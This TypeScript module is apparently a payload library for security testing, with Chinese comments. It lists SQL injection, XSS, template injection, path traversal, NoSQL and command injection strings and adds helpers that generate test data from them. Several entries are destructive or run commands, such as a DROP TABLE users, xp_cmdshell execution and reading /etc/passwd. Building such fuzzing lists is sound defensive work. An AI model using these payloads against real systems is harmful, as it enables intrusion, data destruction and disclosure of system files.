/**
 * SQL 注入 / XSS / 模板注入 / 路径穿越 攻击载荷库
 */

export interface PayloadItem {
  category: string
  value: string
  description: string
}

export const PAYLOADS: PayloadItem[] = [
  // ── SQL Injection ──
  { category: 'SQL', value: "' OR '1'='1", description: '基础布尔注入' },
  { category: 'SQL', value: "' OR '1'='1' --", description: '注释绕过' },
  { category: 'SQL', value: "' OR 1=1 --", description: '数字恒真注入' },
  { category: 'SQL', value: "' UNION SELECT NULL--", description: '联合查询-NULL列数探测' },
  { category: 'SQL', value: "' UNION SELECT 1,2,3--", description: '联合查询-列数验证' },
  { category: 'SQL', value: "admin'--", description: '注释逃逸' },
  { category: 'SQL', value: "1'; DROP TABLE users--", description: '恶意删表' },
  { category: 'SQL', value: "'; EXEC xp_cmdshell 'dir'--", description: 'xp_cmdshell 命令执行' },
  { category: 'SQL', value: "' AND SLEEP(5)--", description: '时间盲注-MySQL' },
  { category: 'SQL', value: "'; WAITFOR DELAY '0:0:5'--", description: '时间盲注-SQL Server' },
  { category: 'SQL', value: "' AND 1=CONVERT(int, @@version)--", description: '版本探测' },
  { category: 'SQL', value: "'; SELECT pg_sleep(5)--", description: '时间盲注-PostgreSQL' },
  { category: 'SQL', value: "' UNION SELECT @@version, NULL, NULL--", description: '联合查询-版本探测' },
  { category: 'SQL', value: "1; SELECT * FROM admin--", description: '堆叠查询' },
  { category: 'SQL', value: "' OR '1'='1' /*", description: '多行注释绕过' },
  { category: 'SQL', value: "' UNION SELECT table_name,NULL FROM information_schema.tables--", description: '联合查询-表名枚举' },
  { category: 'SQL', value: "\\' OR 1=1 --", description: '反斜杠转义逃逸' },
  { category: 'SQL', value: "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--", description: 'SQL Server 配置修改' },

  // ── XSS ──
  { category: 'XSS', value: '<script>alert(1)</script>', description: '基础反射型 XSS' },
  { category: 'XSS', value: '<img src=x onerror=alert(1)>', description: '图片 onerror XSS' },
  { category: 'XSS', value: '<svg onload=alert(1)>', description: 'SVG onload XSS' },
  { category: 'XSS', value: '<a href="javascript:alert(1)">click</a>', description: '伪协议链接 XSS' },
  { category: 'XSS', value: "\"><script>alert(1)</script>", description: '属性逃逸 XSS' },
  { category: 'XSS', value: '<input onfocus=alert(1) autofocus>', description: '输入框自动聚焦 XSS' },
  { category: 'XSS', value: '<details open ontoggle=alert(1)>', description: 'details 标签事件 XSS' },
  { category: 'XSS', value: '<body onload=alert(1)>', description: 'body 加载事件 XSS' },
  { category: 'XSS', value: 'javascript:alert(1)//', description: '伪协议 URL' },
  { category: 'XSS', value: '<scr<script>ipt>alert(1)</scr</script>ipt>', description: '嵌套绕过 XSS' },
  { category: 'XSS', value: '<iframe src="javascript:alert(1)">', description: 'iframe 脚本执行' },
  { category: 'XSS', value: '{{constructor.constructor("alert(1)")()}}', description: '模板引擎 SSTI 探测' },

  // ── Template Injection ──
  { category: 'TMPL', value: '{{7*7}}', description: 'Jinja2/Handlebars SSTI 探测' },
  { category: 'TMPL', value: '${7*7}', description: 'Freemarker SSTI 探测' },
  { category: 'TMPL', value: '#{7*7}', description: 'MyBatis #{} 注入探测' },
  { category: 'TMPL', value: '{{config}}', description: 'Flask config 泄露探测' },

  // ── Path Traversal ──
  { category: 'PATH', value: '../../../etc/passwd', description: 'Unix 路径穿越' },
  { category: 'PATH', value: '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', description: 'Windows 路径穿越' },
  { category: 'PATH', value: '....//....//....//etc/passwd', description: '双点编码绕过' },
  { category: 'PATH', value: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd', description: 'URL 编码路径穿越' },
  { category: 'PATH', value: '..;/..;/..;/etc/passwd', description: '分号截断路径穿越' },

  // ── NoSQL Injection ──
  { category: 'NOSQL', value: '{"$gt": ""}', description: 'MongoDB \$gt 注入' },
  { category: 'NOSQL', value: '{"$ne": ""}', description: 'MongoDB \$ne 注入' },
  { category: 'NOSQL', value: '{"$where": "1==1"}', description: 'MongoDB \$where 注入' },
  { category: 'NOSQL', value: "admin'; return true; var foo='", description: 'NoSQL JS 注入' },

  // ── Command Injection ──
  { category: 'CMD', value: '; id', description: '命令注入 - Unix' },
  { category: 'CMD', value: '| dir', description: '管道命令注入 - Windows' },
  { category: 'CMD', value: '$(id)', description: '命令替换注入' },
  { category: 'CMD', value: '`id`', description: '反引号命令注入' },
  { category: 'CMD', value: '& ping -n 5 127.0.0.1 &', description: '后台命令注入' },
]

/** 获取指定类别的载荷 */
export function getPayloadsByCategory(category?: string): PayloadItem[] {
  if (!category) return PAYLOADS
  return PAYLOADS.filter(p => p.category === category)
}

/** 获取所有载荷值（去重） */
export function getPayloadValues(category?: string): string[] {
  const items = category ? getPayloadsByCategory(category) : PAYLOADS
  return [...new Set(items.map(i => i.value))]
}

/** 生成 SQL 注入 / XSS 测试数据 */
export function generateSqlInjectionData(count: number): string[] {
  const result: string[] = []
  for (let i = 0; i < count; i++) {
    result.push(PAYLOADS[i % PAYLOADS.length].value)
  }
  return result
}
